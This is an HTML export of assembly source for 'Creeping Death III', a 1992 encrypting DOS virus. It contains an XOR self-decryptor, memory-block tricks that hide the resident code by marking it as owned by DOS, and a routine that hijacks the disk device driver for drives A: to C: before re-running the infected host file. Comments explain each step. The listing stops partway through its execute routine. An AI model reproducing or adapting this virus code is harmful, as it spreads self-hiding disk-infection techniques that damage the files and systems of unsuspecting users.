<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;*****************************************************************************;</span><span class="sc0">
</span><span class="sc1">;                                                                             ;</span><span class="sc0">
</span><span class="sc1">; Creeping Death III (Encrypting, try to find it)                             ;</span><span class="sc0">
</span><span class="sc1">;                                                                             ;</span><span class="sc0">
</span><span class="sc1">; (c) Copyright 1992 by Bit Addict                                            ;</span><span class="sc0">
</span><span class="sc1">;                                                                             ;</span><span class="sc0">
</span><span class="sc1">;*****************************************************************************;</span><span class="sc0">

</span><span class="sc5">code</span><span class="sc0"> </span><span class="sc9">segment</span><span class="sc0"> </span><span class="sc9">public</span><span class="sc0"> </span><span class="sc12">'code'</span><span class="sc0">
        </span><span class="sc9">assume</span><span class="sc0">  </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc0">

</span><span class="sc1">;*****************************************************************************;</span><span class="sc0">
</span><span class="sc1">;                                                                             ;</span><span class="sc0">
</span><span class="sc1">; Data                                                                        ;</span><span class="sc0">
</span><span class="sc1">;                                                                             ;</span><span class="sc0">
</span><span class="sc1">;*****************************************************************************;</span><span class="sc0">

        </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc2">5ch</span><span class="sc0">         </span><span class="sc1">; use the space reserved for</span><span class="sc0">
                        </span><span class="sc1">; the fcbs and command line</span><span class="sc0">
                        </span><span class="sc1">; for more inportant data,</span><span class="sc0">
                        </span><span class="sc1">; because we won't need this</span><span class="sc0">
                        </span><span class="sc1">; data when the virus is</span><span class="sc0">
                        </span><span class="sc1">; installed</span><span class="sc0">

</span><span class="sc5">EncryptWrite2</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">36</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">       </span><span class="sc1">; Encrypt DoRequest Encrypt</span><span class="sc0">

</span><span class="sc5">BPB_Buf</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">32</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">       </span><span class="sc1">; buffer for BPB</span><span class="sc0">

</span><span class="sc5">Request</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0">      </span><span class="sc1">; address of the request header</span><span class="sc0">
</span><span class="sc5">RequestOffset</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">RequestSegment</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">


            </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">            </span><span class="sc1">; com-file starts at offset 100</span><span class="sc0">
                        </span><span class="sc1">; hex</span><span class="sc0">

</span><span class="sc1">;*****************************************************************************;</span><span class="sc0">
</span><span class="sc1">;                                                                             ;</span><span class="sc0">
</span><span class="sc1">; Actual start of virus. In this part the virus initializes the stack and     ;</span><span class="sc0">
</span><span class="sc1">; adjusts the device driver used by dos to read and write from floppy's and   ;</span><span class="sc0">
</span><span class="sc1">; hard disks. Then it will start the orginal exe or com-file                  ;</span><span class="sc0">
</span><span class="sc1">;                                                                             ;</span><span class="sc0">
</span><span class="sc1">;*****************************************************************************;</span><span class="sc0">

</span><span class="sc5">Encrypt</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Main</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">    </span><span class="sc1">; this part of the program</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">400h</span><span class="sc4">-</span><span class="sc2">11</span><span class="sc0">      </span><span class="sc1">; will decode the encoded</span><span class="sc0">
</span><span class="sc9">Repeat</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">     </span><span class="sc1">; program, so it can be </span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">          </span><span class="sc1">; executed</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc9">Repeat</span><span class="sc0">

</span><span class="sc5">Main</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc2">600h</span><span class="sc0">         </span><span class="sc1">; init stack</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">Counter</span><span class="sc0">

</span><span class="sc1">;*****************************************************************************;</span><span class="sc0">
</span><span class="sc1">;                                                                             ;</span><span class="sc0">
</span><span class="sc1">; Get dosversion, if the virus is running with dos 4+ then si will be 0 else  ;</span><span class="sc0">
</span><span class="sc1">; si will be -1                                                               ;</span><span class="sc0">
</span><span class="sc1">;                                                                             ;</span><span class="sc0">
</span><span class="sc1">;*****************************************************************************;</span><span class="sc0">

</span><span class="sc5">DosVersion</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">30h</span><span class="sc0">          </span><span class="sc1">; fn 30h = Get Dosversion</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">         </span><span class="sc1">; int 21h</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">            </span><span class="sc1">; major dosversion </span><span class="sc0">
        </span><span class="sc6">sbb</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">drive</span><span class="sc4">[</span><span class="sc2">2</span><span class="sc4">],-</span><span class="sc2">1</span><span class="sc0">    </span><span class="sc1">; set 2nd operand of cmp ah,??</span><span class="sc0">

</span><span class="sc1">;*****************************************************************************;</span><span class="sc0">
</span><span class="sc1">;                                                                             ;</span><span class="sc0">
</span><span class="sc1">; Adjust the size of the codesegment, with dos function 4ah                   ;</span><span class="sc0">
</span><span class="sc1">;                                                                             ;</span><span class="sc0">
</span><span class="sc1">;*****************************************************************************;</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">60h</span><span class="sc0">          </span><span class="sc1">; Adjust size of memory block</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4ah</span><span class="sc0">          </span><span class="sc1">; to 60 paragraphs = 600h bytes</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">         </span><span class="sc1">; int 21h</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">52h</span><span class="sc0">          </span><span class="sc1">; get internal list of lists</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">         </span><span class="sc1">; int 21h</span><span class="sc0">

</span><span class="sc1">;*****************************************************************************;</span><span class="sc0">
</span><span class="sc1">;                                                                             ;</span><span class="sc0">
</span><span class="sc1">; If the virus code segment is located behind the dos config memory block the ;</span><span class="sc0">
</span><span class="sc1">; code segment will be part of the config memory block making it 61h          ;</span><span class="sc0">
</span><span class="sc1">; paragraphs larger. If the virus is not located next to the config memory    ;</span><span class="sc0">
</span><span class="sc1">; block the virus will set the owner to 8h (Dos system)                       ;</span><span class="sc0">
</span><span class="sc1">;                                                                             ;</span><span class="sc0">
</span><span class="sc1">;*****************************************************************************;</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; segment of first MCB</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">           </span><span class="sc1">; dx = MCB of the code segment</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc5">NextMCB</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">           </span><span class="sc1">; ax = segment next MCB</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">           </span><span class="sc1">; are they equal ?</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">NextMCB</span><span class="sc0">         </span><span class="sc1">; no, not 1st program executed</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">NoBoot</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc2">61h</span><span class="sc0"> </span><span class="sc1">; add 61h to size of block</span><span class="sc0">
</span><span class="sc5">NoBoot</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">           </span><span class="sc1">; ds = segment of MCB</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">8</span><span class="sc0">   </span><span class="sc1">; owner = dos system</span><span class="sc0">

</span><span class="sc1">;*****************************************************************************;</span><span class="sc0">
</span><span class="sc1">;                                                                             ;</span><span class="sc0">
</span><span class="sc1">; The virus will search for the disk paramenter block for drive a: - c: in    ;</span><span class="sc0">
</span><span class="sc1">; order to find the device driver for these block devices. If any of these    ;</span><span class="sc0">
</span><span class="sc1">; blocks is found the virus will install its own device driver and set the    ;</span><span class="sc0">
</span><span class="sc1">; access flag to -1 to tell dos this device hasn't been accesed yet.          ;</span><span class="sc0">
</span><span class="sc1">;                                                                             ;</span><span class="sc0">
</span><span class="sc1">;*****************************************************************************;</span><span class="sc0">

        </span><span class="sc6">cld</span><span class="sc0">             </span><span class="sc1">; clear direction flag</span><span class="sc0">
        </span><span class="sc6">lds</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; get pointer to first drive</span><span class="sc0">
                        </span><span class="sc1">; paramenter block</span><span class="sc0">

</span><span class="sc5">Search</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">           </span><span class="sc1">; last block ?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">Last</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">15h</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; get segment of device header</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">70h</span><span class="sc0">          </span><span class="sc1">; dos device header ??</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Next</span><span class="sc0">            </span><span class="sc1">; no, go to next device</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">],-</span><span class="sc2">1</span><span class="sc0"> </span><span class="sc1">; set access flag to "drive </span><span class="sc0">
                        </span><span class="sc1">; has not been accessed"</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Header</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">  </span><span class="sc1">; set address of new device</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">13h</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; and save old address</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">15h</span><span class="sc4">],</span><span class="sc8">cs</span><span class="sc0">
</span><span class="sc5">Next</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">lds</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">19h</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; next drive parameter block</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Search</span><span class="sc0">

</span><span class="sc1">;*****************************************************************************;</span><span class="sc0">
</span><span class="sc1">;                                                                             ;</span><span class="sc0">
</span><span class="sc1">; If the virus has failed in starting the orginal exe-file it will jump here. ;</span><span class="sc0">
</span><span class="sc1">;                                                                             ;</span><span class="sc0">
</span><span class="sc1">;*****************************************************************************;</span><span class="sc0">

</span><span class="sc5">Boot</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">16h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; es = parent PSP</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">16h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; bx = parent PSP of Parent PSP</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">; filename+path available ?</span><span class="sc0">
        </span><span class="sc6">jnb</span><span class="sc0"> </span><span class="sc5">Exec</span><span class="sc0">            </span><span class="sc1">; yes, execute it</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">           </span><span class="sc1">; get segment of MCB</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">            </span><span class="sc1">; count length of filename</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc0">
</span><span class="sc5">Count</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">loopne</span><span class="sc0">  </span><span class="sc5">Count</span><span class="sc0">
        </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">
</span><span class="sc5">NextByte</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">            </span><span class="sc1">; search for this name in the</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">          </span><span class="sc1">; parent PSP to find the path</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">          </span><span class="sc1">; to this file</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">cmpsb</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">NextByte</span><span class="sc0">
</span><span class="sc5">BeginName</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">          </span><span class="sc1">; name found, search for start</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">; of name+path</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">BeginName</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">Exec</span><span class="sc0">      </span><span class="sc1">; execute it</span><span class="sc0">

</span><span class="sc1">;*****************************************************************************;</span><span class="sc0">
</span><span class="sc1">;                                                                             ;</span><span class="sc0">
</span><span class="sc1">; If none of these devices is found it means the virus is already resident    ;</span><span class="sc0">
</span><span class="sc1">; and the virus wasn't able to start the orginal exe-file (the file is        ;</span><span class="sc0">
</span><span class="sc1">; corrupted by copying it without the virus memory resident). If the device   ;</span><span class="sc0">
</span><span class="sc1">; is found the information in the header is copied.                           ;</span><span class="sc0">
</span><span class="sc1">;                                                                             ;</span><span class="sc0">
</span><span class="sc1">;*****************************************************************************;</span><span class="sc0">

</span><span class="sc5">Last</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">jcxz</span><span class="sc0">    </span><span class="sc5">Exit</span><span class="sc0">

</span><span class="sc1">;*****************************************************************************;</span><span class="sc0">
</span><span class="sc1">;                                                                             ;</span><span class="sc0">
</span><span class="sc1">; The information about the dos device driver is copyed to the virus code     ;</span><span class="sc0">
</span><span class="sc1">; segment                                                                     ;</span><span class="sc0">
</span><span class="sc1">;                                                                             ;</span><span class="sc0">
</span><span class="sc1">;*****************************************************************************;</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">           </span><span class="sc1">; ds = segment of Device Driver</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Header</span><span class="sc0">    </span><span class="sc1">; prepare header of the viral</span><span class="sc0">
        </span><span class="sc6">movsw</span><span class="sc0">               </span><span class="sc1">; device driver and save the</span><span class="sc0">
        </span><span class="sc6">lodsw</span><span class="sc0">               </span><span class="sc1">; address of the dos strategy</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:</span><span class="sc5">StrBlock</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">      </span><span class="sc1">; and interrupt procedures</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Strategy</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">lodsw</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:</span><span class="sc5">IntBlock</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Interrupt</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">movsb</span><span class="sc0">

</span><span class="sc1">;*****************************************************************************;</span><span class="sc0">
</span><span class="sc1">;                                                                             ;</span><span class="sc0">
</span><span class="sc1">; Deallocate the environment memory block and start the this file again, but  ;</span><span class="sc0">
</span><span class="sc1">; if the virus succeeds it will start the orginal exe-file.                   ;</span><span class="sc0">
</span><span class="sc1">;                                                                             ;</span><span class="sc0">
</span><span class="sc1">;*****************************************************************************;</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">2ch</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; environment segment</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">           </span><span class="sc1">; environment available ?</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">Boot</span><span class="sc0">            </span><span class="sc1">; no, computer is rebooted</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">49h</span><span class="sc0">          </span><span class="sc1">; deallocate memory</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">           </span><span class="sc1">; end of environment is marked</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">; with two zero bytes</span><span class="sc0">
</span><span class="sc5">Seek</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">          </span><span class="sc1">; scan for end of environment</span><span class="sc0">
        </span><span class="sc6">scasw</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Seek</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; es:si = start of filename</span><span class="sc0">
</span><span class="sc5">Exec</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Param</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">cs</span><span class="sc0">        </span><span class="sc1">; set segments in EPB</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">],</span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Filename</span><span class="sc0">  </span><span class="sc1">; copy name of this file</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">40</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsw</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">

